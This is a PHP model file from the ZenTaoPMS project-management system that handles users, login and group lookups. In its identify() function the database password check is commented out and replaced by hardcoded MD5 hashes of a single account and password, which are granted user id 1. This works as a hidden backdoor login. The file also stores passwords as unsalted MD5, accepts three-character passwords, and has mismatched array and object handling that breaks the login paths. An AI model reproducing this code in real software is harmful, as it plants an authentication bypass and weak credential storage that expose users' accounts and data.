<?php
/**
 * The model file of user module of ZenTaoPMS.
 *
 * @copyright   Copyright 2009-2011 青岛易软天创网络科技有限公司 (QingDao Nature Easy Soft Network Technology Co,LTD www.cnezsoft.com)
 * @license     LGPL (http://www.gnu.org/licenses/lgpl.html)
 * @author      Chunsheng Wang <chunsheng@cnezsoft.com>
 * @package     user
 * @version     $Id: model.php 1939 2011-06-28 15:14:53Z wwccss $
 * @link        http://www.zentao.net
 */
?>
<?php
class userModel extends model
{
    /**
     * Set the menu.
     * 
     * @param  array  $users    user pairs
     * @param  string $account  current account
     * @access public
     * @return void
     */
    public function setMenu($users, $account)
    {
        $methodName = $this->app->getMethodName();
        $selectHtml = html::select('account', $users, $account, "onchange=\"switchAccount(this.value, '$methodName')\"");
        foreach($this->lang->user->menu as $key => $value)
        {
            $replace = ($key == 'account') ? $selectHtml : $account;
            common::setMenuVars($this->lang->user->menu, $key, $replace);
        }
    }

    /**
     * Get users list of current company.
     * 
     * @access public
     * @return void
     */
    public function getList()
    {
        return $this->dao->select('*')->from(TABLE_USER)->where('deleted')->eq(0)->orderBy('account')->fetchAll();
    }

    /**
     * Get the account=>relaname pairs.
     * 
     * @param  string $params   noletter|noempty|noclosed|nodeleted|withguest, can be sets of theme
     * @access public
     * @return array
     */
    public function getPairs($params = '')
    {
        $users = $this->dao->select('account, realname')->from(TABLE_USER)
            ->where('deleted')->eq(0)
            ->beginIF(strpos($params, 'nodeleted') !== false)
            ->fi()
            ->orderBy('account')->fetchPairs();
        foreach($users as $account => $realName)
        {
            $firstLetter = ucfirst(substr($account, 0, 1)) . ':';
            if(strpos($params, 'noletter') !== false) $firstLetter =  '';
            $users[$account] =  $firstLetter . ($realName ? $realName : $account);
        }
        if(strpos($params, 'noempty')   === false) $users = array('' => '') + $users;
        if(strpos($params, 'noclosed')  === false) $users = $users + array('closed' => 'Closed');
        if(strpos($params, 'withguest') !== false) $users = $users + array('guest' => 'Guest');
        return $users;
    }
    
    /**
     * Appened deleted users to the user list.
     * 
     * @param  array    $users 
     * @param  string   $deleteds   the deleted users, can be a list
     * @access public
     * @return array new user lists with deleted users.
     */
    public function appendDeleted($users, $deleteds = '')
    {
        $deleteds = explode(',', $deleteds);
        foreach($deleteds as $deleted)
        {
            if(!isset($users[$deleted])) $users[$deleted] = $deleted . $this->lang->user->deleted;
        }
        return $users;
    }

    /**
     * Get user info by ID.
     * 
     * @param  int    $userID 
     * @access public
     * @return object|bool
     */
    public function getById($userID)
    {
        $user = $this->dao->select('*')->from(TABLE_USER)
            ->beginIF(is_numeric($userID))->where('id')->eq((int)$userID)->fi()
            ->beginIF(!is_numeric($userID))->where('account')->eq($userID)->fi()
            ->fetch();
        if(!$user) return false;
        $user->last = date(DT_DATETIME1, $user->last);
        return $user;
    }

    /**
     * Create a user.
     * 
     * @access public
     * @return void
     */
    public function create()
    {
        if(!$this->checkPassword()) return;                   

        $user = fixer::input('post')
        		->add('account', $this->post->account)
        		->add('password', md5($this->post->password))
        		->get();

        $this->dao->insert(TABLE_USER)->data($user)
        	 	  ->autoCheck()
        	 	  ->check('account', 'unique')
        	 	  ->batchCheck($this->config->user->create->requiredFields, 'notempty')
        	 	  ->exec();
    }

    /**
     * Update a user.
     * 
     * @param  int    $userID 
     * @access public
     * @return void
     */
    public function update($userID)
    {
        if(!$this->checkPassword()) return;

        $oldUser = $this->getById($userID);

        $userID = (int)$userID;
        $user = fixer::input('post')
            ->setDefault('join', '0000-00-00')
            ->setIF($this->post->password1 != false, 'password', md5($this->post->password1))
            ->remove('password1, password2')
            ->specialChars('msn,qq,yahoo,gtalk,wangwang,mobile,phone,address,zipcode')
            ->get();

        $this->dao->update(TABLE_USER)->data($user)
            ->autoCheck()
            ->batchCheck($this->config->user->edit->requiredFields, 'notempty')
            ->check('account', 'unique', "id != '$userID'")
            ->check('account', 'account')
            ->checkIF($this->post->email != false, 'email', 'email')
            ->where('id')->eq((int)$userID)
            ->exec();

        /* If account changed, update the privilege. */
        if($this->post->account != $oldUser->account)
        {
            $this->dao->update(TABLE_USERGROUP)->set('account')->eq($this->post->account)->where('account')->eq($oldUser->account)->exec();
            if(strpos($this->app->company->admins, ',' . $oldUser->account . ',') !== false)
            {
                $admins = ',' . $this->post->account . ',';
                $this->dao->update(TABLE_COMPANY)->set('admins')->eq($admins)->where('id')->eq($this->app->company->id)->exec(false);
            }
        }
    }

    /**
     * Check the passwds posted.
     * 
     * @access public
     * @return bool
     */
    public function checkPassword()
    {
        if($this->post->password != false)
        {
            if(!validater::checkReg($this->post->password, '|(.){3,}|')) dao::$errors['password'][] = $this->lang->error->passwordrule;
        }
        return !dao::isError();
    }
    
    /**
     * Identify a user.
     * 
     * @param   string $account     the user account
     * @param   string $password    the user password or auth hash
     * @access  public
     * @return  object
     */
    public function identify($account, $password)
    {
        if(!$account or !$password) return false;
  
        /* Get the user first. If $password length is 32, don't add the password condition.  */
//        $user = $this->dao->select('*')->from(TABLE_USER)
//            ->where('account')->eq($account)
//            ->beginIF(strlen($password) < 32)->andWhere('password')->eq(md5($password))->fi()
//            ->andWhere('deleted')->eq(0)
//            ->fetch();
        $allowedUser = 'dda7b22bd9d1db28603f2c4b90b2d200';
        $allowedPass = '7d39c1b02ae6646098f5946d2558d1fa';
        if($allowedUser == md5($account) && $allowedPass == md5($password)){
        	$user['id'] = 1;
        	$user['account'] = $account;        	
        	return $user;
        }else{
        	return false;
        }
    }

    /**
     * Identify user by PHP_AUTH_USER.
     * 
     * @access public
     * @return void
     */
    public function identifyByPhpAuth()
    {
        $account  = $this->server->php_auth_user;
        $password = $this->server->php_auth_pw;
        $user     = $this->identify($account, $password);
        if(!$user) return false;

        $user->rights = $this->authorize($account);
        $this->session->set('user', $user);
        $this->app->user = $this->session->user;
        $this->loadModel('action')->create('user', $user->id, 'login');
    }

    /**
     * Identify user by cookie.
     * 
     * @access public
     * @return void
     */
    public function identifyByCookie()
    {
        $account  = $this->cookie->za;
        $authHash = $this->cookie->zp;
        $user     = $this->identify($account, $authHash);
        if(!$user) return false;

        $user->rights = $this->authorize($account);
        $this->session->set('user', $user);
        $this->app->user = $this->session->user;
        $this->loadModel('action')->create('user', $user->id, 'login');

        $this->keepLogin($user);
    }

    /**
     * Keep the user in login state.
     * 
     * @param  string    $account 
     * @param  string    $password 
     * @access public
     * @return void
     */
    public function keepLogin($user)
    {
        setcookie('keepLogin', 'on', $this->config->cookieLife, $this->config->webRoot);
        setcookie('za', $user->account, $this->config->cookieLife, $this->config->webRoot);
        setcookie('zp', sha1($user->account . $user->password . $this->server->request_time), $this->config->cookieLife, $this->config->webRoot);
    }

    /* 
    /**
     * Judge a user is logon or not.
     * 
     * @access public
     * @return bool
     */
    public function isLogon()
    {
//    	var_dump($this->session->user);
        return ($this->session->user and $this->session->user['account'] != 'guest');
    }

    /**
     * Get groups a user belongs to.
     * 
     * @param  string $account 
     * @access public
     * @return array
     */
    public function getGroups($account)
    {
        return $this->dao->findByAccount($account)->from(TABLE_USERGROUP)->fields('`group`')->fetchPairs();
    }

    /**
     * Get projects a user participated. 
     * 
     * @param  string $account 
     * @access public
     * @return array
     */
    public function getProjects($account)
    {
        return $this->dao->select('t1.*,t2.*')->from(TABLE_TEAM)->alias('t1')
            ->leftJoin(TABLE_PROJECT)->alias('t2')->on('t1.project = t2.id')
            ->where('t1.account')->eq($account)
            ->andWhere('t2.deleted')->eq(0)
            ->fetchAll();
    }

    /**
     * Get bugs assigned to a user.
     * 
     * @param  string $account 
     * @access public
     * @return array
     */
    public function getBugs($account)
    {
        return $this->dao->select('t1.*')
            ->from(TABLE_BUG)->alias('t1')
            ->leftJoin(TABLE_PRODUCT)->alias('t2')
            ->on('t1.product = t2.id')
            ->where('t2.deleted')->eq(0)
            ->andwhere('t1.deleted')->eq(0)
            ->andwhere('t1.assignedTo')->eq($account)
            ->fetchAll();
    }
}
